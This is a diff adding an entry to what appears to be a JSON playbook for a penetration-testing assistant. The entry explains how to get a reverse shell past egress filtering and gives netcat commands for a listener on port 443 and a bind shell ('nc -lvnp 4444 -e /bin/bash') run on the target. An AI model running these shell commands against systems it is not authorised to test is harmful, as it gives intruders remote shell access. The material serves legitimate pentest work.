@@ -39,6 +39,54 @@
       ]
     },
     {
+      "id": "egress-blocked-shell",
+      "title": "Reverse Shell Never Connects — Egress Is Filtered",
+      "tool": "nc",
+      "tools": [
+        "nc",
+        "ncat",
+        "socat"
+      ],
+      "os": [
+        "linux",
+        "windows"
+      ],
+      "requires_all": [
+        "blocker.egress_blocked"
+      ],
+      "produces": [
+        "advice.egress"
+      ],
+      "priority": 64,
+      "hypothesis": "Your payload ran but nothing hit your listener, or a test connection is refused/timed out: the target cannot reach you OUTBOUND on that port. The box is not unexploitable — pick a port egress allows (443/53 almost always leave), or flip the direction with a BIND shell and connect IN to the target instead.",
+      "proves": "nothing attack-wise; it gets a shell channel through a filtered egress",
+      "does_not_prove": "that all egress is blocked — usually only some ports are; 443/53 commonly pass",
+      "report": {
+        "finding": "Egress filtering on reverse-shell port",
+        "severity": "info"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux"
+      ],
+      "commands": [
+        {
+          "tool": "nc",
+          "run": "sudo nc -lvnp 443   # and point the payload at {{lhost}}:443",
+          "note": "Retry the reverse shell on 443 (then 53): outbound web/DNS almost always leaves even a filtered network. Needs sudo to bind <1024."
+        },
+        {
+          "tool": "nc",
+          "run": "# on the TARGET: nc -lvnp 4444 -e /bin/bash   # then from Kali: nc {{target}} 4444",
+          "note": "BIND shell: if the target cannot dial OUT but you can reach a port IN, have IT listen and you connect. The inverse of a reverse shell."
+        },
+        {
+          "tool": "socat",
+          "run": "ss -tlnp; iptables -L -n   # (from any foothold) confirm what egress/listeners exist",
+          "note": "If you already have any foothold, check its own firewall/egress so you choose a port that actually works instead of guessing."
+        }
+      ]
+    },
+    {
       "id": "shell-revshell-linux",
       "title": "Linux Reverse-Shell Payload",
       "hypothesis": "A confirmed command-execution primitive on a Linux target becomes an interactive shell by firing a bash or python callback back to your listener.",
